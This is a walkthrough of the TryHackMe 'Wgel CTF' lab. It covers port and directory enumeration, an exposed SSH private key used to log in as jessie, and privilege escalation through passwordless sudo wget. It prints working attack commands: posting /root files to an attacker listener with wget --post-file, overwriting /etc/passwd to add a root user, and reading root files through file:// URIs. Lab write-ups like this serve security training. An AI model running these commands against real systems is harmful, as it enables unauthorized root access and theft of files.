# 💧 Wgel CTF — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** CTF / Linux Privilege Escalation
**Tags:** `nmap` `gobuster` `ssh` `ssh-key` `wget` `gtfobins` `privilege-escalation`

---

## Overview

The Wgel CTF is a clean, focused room that teaches two critical skills: discovering exposed SSH private keys through web enumeration, and abusing `wget` with sudo permissions for privilege escalation. The name itself is a hint — `wget` plays a central role in both getting in and getting root. A great room for understanding how developer carelessness (leaving `.ssh` directories exposed) can lead to full system compromise.

---

## Reconnaissance

### Nmap — Port Scanning

```bash
nmap -sV -sC -p- -oN nmap_wgel.txt <TARGET_IP>
```

**Flags explained:**
- `-sV` — Service and version detection
- `-sC` — Default NSE script scan
- `-p-` — Scan all 65535 ports (not just top 1000)
- `-oN` — Save output to file

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

---

## Web Enumeration

### Apache Default Page — Source Inspection

Navigate to `http://<TARGET_IP>`. You'll see the default Apache "It works!" page. Before running tools, **view page source**:

```
<!-- Jessie don't forget to add your name to the file -->
```

A username — `jessie` — is revealed in an HTML comment. Note this for later.

### Directory Brute-Forcing with Gobuster

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 40 -o gobuster_wgel.txt
```

**Results:**
```
/sitemap    (Status: 200)
```

Navigate to `http://<TARGET_IP>/sitemap` — you'll find a website template. Run Gobuster again on this subdirectory:

```bash
gobuster dir -u http://<TARGET_IP>/sitemap -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
```

**Key finding:**
```
/.ssh    (Status: 301)
```

---

## SSH Private Key Discovery

Navigate to `http://<TARGET_IP>/sitemap/.ssh/` in your browser. You'll find an exposed `id_rsa` private key file.

### Download the Private Key

```bash
wget http://<TARGET_IP>/sitemap/.ssh/id_rsa
```

### Set Correct Permissions

SSH requires private keys to have restricted permissions:

```bash
chmod 600 id_rsa
```

Without this, SSH will refuse to use the key and throw a "bad permissions" error.

---

## Initial Access — SSH with Private Key

Using the username discovered earlier and the downloaded key:

```bash
ssh -i id_rsa jessie@<TARGET_IP>
```

**Flag explained:**
- `-i` — Specify identity file (private key)

You're now logged in as `jessie`. ✅

---

## User Flag

```bash
ls -la
find / -name "user_flag.txt" 2>/dev/null
```

Or check common locations:

```bash
ls ~/Desktop
cat ~/Desktop/user_flag.txt
```

User flag captured. ✅

---

## Privilege Escalation

### Checking Sudo Permissions

```bash
sudo -l
```

**Output:**
```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

`jessie` can run `wget` as root without a password. This is exploitable via **GTFOBins**.

### Method 1 — Exfiltrate Root Flag Directly

Use `wget` to POST the contents of `/root/root_flag.txt` to a listener on your machine:

**On your attacking machine, start a netcat listener:**
```bash
nc -lvnp 8888
```

**On the target:**
```bash
sudo wget --post-file=/root/root_flag.txt http://<YOUR_IP>:8888
```

**Flags explained:**
- `--post-file` — Send file contents as HTTP POST body

Your netcat listener will receive the file contents — including the root flag. ✅

### Method 2 — Overwrite /etc/passwd for Full Root Shell

Generate a new password hash:

```bash
openssl passwd -1 -salt hacker password123
```

Copy the output hash. On your machine, create a modified passwd file with a new root-level user:

```bash
# Download the current passwd file first
sudo wget http://<YOUR_IP>:8888/passwd -O /etc/passwd
```

**On your machine**, serve a modified `/etc/passwd` that adds:
```
hacker:$1$hacker$<HASH>:0:0:root:/root:/bin/bash
```

Then on target:
```bash
sudo wget http://<YOUR_IP>/passwd -O /etc/passwd
su hacker
```

You now have a root shell.

### Method 3 — Read Any Root File

```bash
sudo wget -O - file:///root/root_flag.txt
```

**Flags explained:**
- `-O -` — Output to stdout instead of a file
- `file://` — Read local files using file URI scheme

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Reconnaissance | Full port scan | Nmap |
| Username discovery | HTML comment in page source | Browser |
| Directory enumeration | Brute-force subdirectories | Gobuster |
| Key discovery | Exposed `.ssh` directory | Browser / wget |
| Initial access | SSH with private key | ssh -i |
| Privilege escalation | wget sudo abuse | GTFOBins |

---

## Key Takeaways

- **Exposed `.ssh` directories** are a critical misconfiguration — web servers should never serve SSH keys
- Always run Gobuster recursively on discovered subdirectories, not just the root
- `sudo -l` reveals the privilege escalation path — always run it immediately after gaining a shell
- GTFOBins documents dozens of binaries (including `wget`) that can be abused when granted sudo
- `wget --post-file` is a clever way to exfiltrate files when you can't get an interactive root shell

---

*Room link: https://tryhackme.com/room/wgelctf*
